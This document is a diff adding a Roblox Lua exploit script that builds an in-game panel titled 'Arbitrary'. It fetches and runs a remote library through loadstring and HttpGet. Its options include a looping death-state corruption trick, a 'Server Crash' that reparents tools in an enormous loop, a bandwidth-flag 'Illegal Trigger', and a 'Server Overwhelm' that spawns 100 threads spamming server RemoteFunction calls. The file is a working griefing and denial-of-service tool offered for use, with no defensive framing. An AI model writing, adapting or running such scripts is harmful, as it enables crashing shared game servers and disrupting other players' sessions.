@@ -1,0 +1,123 @@
+local L = loadstring(game:HttpGet(
+"https://raw.githubusercontent.com/verymysteriousacc/Packages-ServerSide/main/ArbitraryLibrary"
+))()
+
+local W = L.new({
+Name = "Arbitrary (Test)",
+Title = "Arbitrary",
+Subtitle = "Replication Panel",
+Size = UDim2.fromOffset(620, 390)
+})
+
+local tab1 = W:Tab("Replication")
+
+tab1:Option("Make Death State Corrupted (WIP doesnt work yet)", function()
+warn()
+end)
+
+tab1:Option("Corrupt Death State", function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local enabled = false
+
+local screenGui = Instance.new("ScreenGui")  
+local button = Instance.new("TextButton")  
+local aspect = Instance.new("UIAspectRatioConstraint")  
+local corner = Instance.new("UICorner")  
+
+local character  
+local humanoid  
+
+screenGui.Name = "MobileButtonGui"  
+screenGui.ResetOnSpawn = false  
+screenGui.Parent = playerGui  
+
+button.Name = "ActionButton"  
+button.Parent = screenGui  
+button.Text = "clark"  
+button.TextScaled = true  
+button.AutoButtonColor = true  
+button.Active = true  
+button.AnchorPoint = Vector2.new(1, 0.5)  
+button.Position = UDim2.new(1, -25, 0.5, 0)  
+button.Size = UDim2.fromOffset(140, 55)  
+
+aspect.AspectRatio = 2.5  
+aspect.Parent = button  
+
+corner.CornerRadius = UDim.new(0, 10)  
+corner.Parent = button  
+
+local function updateCharacter()  
+	character = player.Character or player.CharacterAdded:Wait()  
+	humanoid = character:WaitForChild("Humanoid")  
+end  
+
+updateCharacter()  
+
+player.CharacterAdded:Connect(updateCharacter)  
+
+button.MouseButton1Click:Connect(function()  
+	enabled = not enabled  
+	button.Text = enabled and "" or ""  
+end)  
+
+task.spawn(function()  
+	while task.wait() do  
+		if enabled and humanoid then  
+			replicatesignal(player.kill)
+			humanoid:ChangeState(Enum.HumanoidStateType.Dead)  
+			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)  
+		end  
+	end  
+end)
+
+end)
+
+tab1:Option("IsServerAuthorityEnabled", function()
+if workspace.AuthorityMode == Enum.AuthorityMode.Server then
+print("0")
+else
+print("1")
+end
+end)
+
+tab1:Option("Repl -OLItems Server Crash", function()
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local backpack = localPlayer:WaitForChild("Backpack")
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+
+for i = 1, 100000000000 do
+for _, tool in ipairs(backpack:GetChildren()) do
+if tool:IsA("Tool") then
+tool.Parent = character
+tool.Parent = backpack
+end
+end
+end
+end)
+
+tab1:Option("Repl -HB Server C++ Illegal Trigger", function()
+game:DefineFastInt("NextGenerationReplicationBandwidthLimit", "1000000000")
+game:DefineFastFlag("EnableNextGenerationReplication", true)
+end)
+
+tab1:Option("Boundrary -RF Server Overwhelm", function()
+local s = game:GetService("RobloxReplicatedStorage")
+local r1 = s:FindFirstChild("GetServerVersion")
+local r2 = s:FindFirstChild("GetServerType")
+local r3 = s:FindFirstChild("GetServerData")
+
+for i = 1, 100 do
+task.spawn(function()
+while task.wait() do
+r1:InvokeServer()
+r2:InvokeServer()
+r3:InvokeServer()
+end
+end)
+end
+end)
